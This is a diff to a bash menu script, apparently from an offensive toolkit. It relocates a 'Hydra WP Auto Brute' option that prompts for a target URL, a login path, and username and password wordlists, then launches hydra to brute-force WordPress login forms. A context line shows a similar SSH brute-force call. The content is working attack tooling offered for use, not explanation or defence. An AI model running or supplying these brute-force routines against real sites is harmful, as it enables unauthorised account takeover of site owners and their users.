@@ -876,6 +876,36 @@ hydra $hydraip3 -s 22 ssh -l $hydrauser3 -P $hydrapasslist3
 
 read
 
+elif [ "$x" == "$HYDRAWPAUTOBRUTE" ]; then                    #hynull-Option-9
+clear
+echo "Hydra WP Auto Brute"
+echo "Url (ex:target.com) : http://" 
+read url
+echo "Path (ex:/wp-login.php) : " 
+read path
+echo "User (ex:admin or /path/wordlist.txt) : " 
+read user
+echo "Pass (ex:12345 or /path/wordlist.txt) : " 
+read pass
+echo "Bad Login (ex:wrong) : " 
+read bad
+echo "Parameter (ex:username=^USER^&password=^PASS^) : " 
+read parameter
+sleep 1
+echo "[+] Execute : http://$url/$path"
+sleep 0.5
+echo "[+] User : $user"
+sleep 0.5
+echo "[+] Pass : $pass"
+sleep 0.5
+echo "[+] Bad Login : $bad"
+sleep 0.5
+echo "[+] Parameter : $parameter"
+sleep 0.5
+hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass
+
+read
+
 elif [ "$x" == "$hynull6" ]; then                    #hynull-Option-6
 clear
 echo -e '\e[1;33m
@@ -1075,38 +1105,6 @@ echo -e '
 '
 
 sqldict
-
-read
-
-elif [ "$x" == "$HYDRAWPAUTOBRUTE" ]; then                    #hynull-Option-9
-clear
-echo "
-Hydra WP Auto Brute
- "
-echo "Url (ex:target.com) : http://" 
-read url
-echo "Path (ex:/wp-login.php) : " 
-read path
-echo "User (ex:admin or /path/wordlist.txt) : " 
-read user
-echo "Pass (ex:12345 or /path/wordlist.txt) : " 
-read pass
-echo "Bad Login (ex:wrong) : " 
-read bad
-echo "Parameter (ex:username=^USER^&password=^PASS^) : " 
-read parameter
-sleep 1
-echo "[+] Execute : http://$url/$path"
-sleep 0.5
-echo "[+] User : $user"
-sleep 0.5
-echo "[+] Pass : $pass"
-sleep 0.5
-echo "[+] Bad Login : $bad"
-sleep 0.5
-echo "[+] Parameter : $parameter"
-sleep 0.5
-exec hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass
 
 read
 
